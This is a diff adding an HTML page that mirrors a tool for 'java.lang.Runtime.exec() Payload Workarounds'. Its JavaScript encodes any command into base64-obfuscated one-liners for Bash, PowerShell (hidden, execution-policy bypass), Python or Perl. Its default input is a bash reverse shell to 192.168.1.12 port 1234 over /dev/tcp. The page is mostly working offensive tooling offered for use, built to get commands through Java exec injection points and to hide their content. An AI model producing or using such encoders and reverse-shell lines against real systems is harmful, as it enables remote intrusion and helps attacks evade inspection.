@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</title>
+            <meta charset="utf-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <link rel="stylesheet" href="./theme/css/main.css" type="text/css" />
+            <link rel="stylesheet" href="./theme/css/prism.css" type="text/css" />
+            <link href="./feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="@Jackson_T ATOM Feed" />
+            
+        </head>
+        <body>
+            <div id="wrap">
+                <div id="container">
+                    <div class="entry">
+<header>
+<h1><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" id="site-title">原地址</a>        </h1>
+<time datetime="2016-12-12T10:20:00-05:00">Mon 12 December 2016</time></header>
+<article>
+<p>Input type:
+<input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked><label for="bash">Bash</label>
+<input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
+<input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
+<input type="radio" id="perl" name="option" value="perl" onclick="processInput();"><label for="perl">Perl</label></p>
+<p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="bash -i >& /dev/tcp/192.168.1.12/1234 0>&1">bash -i >& /dev/tcp/192.168.1.12/1234 0>&1</textarea>
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly></textarea></p>
+<script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
+</script>
+</article>
+                    </div>
+                </div>
+               
+                
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-65389616-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+            </div>
+        <script type="text/javascript" src="./theme/js/prism.js"></script>
+        <script type="text/javascript">
+          function toggleTheme() {
+            if (window.getComputedStyle(document.body).backgroundColor === 'rgb(255, 255, 255)') {
+              document.body.style.backgroundColor = '#222';
+              document.body.style.color = '#ddd';
+              document.getElementById('toggle-theme').innerText = 'Light Theme';
+            } else {
+              document.body.style.backgroundColor = '#fff';
+              document.body.style.color = '#585858';
+              document.getElementById('toggle-theme').innerText = 'Dark Theme';
+            }
+          }
+        </script>
+        </body>
+    </html>
